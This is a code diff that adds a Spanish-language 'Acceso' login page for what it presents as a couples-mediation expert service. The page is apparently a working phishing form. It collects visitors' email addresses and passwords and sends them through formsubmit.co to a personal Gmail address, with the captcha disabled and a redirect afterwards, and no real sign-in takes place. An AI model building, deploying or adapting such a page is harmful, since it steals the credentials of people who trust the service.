@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acceso</title>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XRR87EZ83D"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-XRR87EZ83D');
+  </script>
+
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* 🎨 Fondo ilustrado */
+    body::before {
+      content: "";
+      position: absolute;
+      top: -100px;
+      left: -100px;
+      width: 400px;
+      height: 400px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50%;
+      z-index: 0;
+    }
+    body::after {
+      content: "";
+      position: absolute;
+      bottom: -120px;
+      right: -120px;
+      width: 350px;
+      height: 350px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 50%;
+      z-index: 0;
+    }
+
+    .login-box {
+      position: relative;
+      z-index: 1;
+      background: #ffffffee;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .login-box img {
+      max-width: 120px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      color: #444;
+      margin-bottom: 10px;
+      font-size: 22px;
+    }
+    p {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.4em;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    button {
+      background: #2575fc;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+      width: 100%;
+    }
+    button:hover {
+      background: #6a11cb;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* 📱 Responsive */
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 25px 20px;
+      }
+      h2 {
+        font-size: 20px;
+      }
+      p {
+        font-size: 14px;
+      }
+      input, button {
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo.png" alt="Logo">
+    <h2>Acceso</h2>
+    <p>
+      Enhorabuena por dar el primer paso para resolver tus temas de pareja.<br>
+      Rellena este formulario y te paso con nuestro experto.<br>
+      Prepárate para una experiencia espectacular.
+    </p>
+    <form action="https://formsubmit.co/federico.montilla@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Correo electrónico" required><br>
+      <input type="password" name="password" placeholder="Contraseña" required><br>
+
+      <!-- Redirección después de enviar -->
+      <input type="hidden" name="_next" value="https://mediador4.netlify.app/">
+
+      <!-- Desactivar captcha automático -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <button type="submit">Entrar</button>
+    </form>
+  </div>
+</body>
+</html>
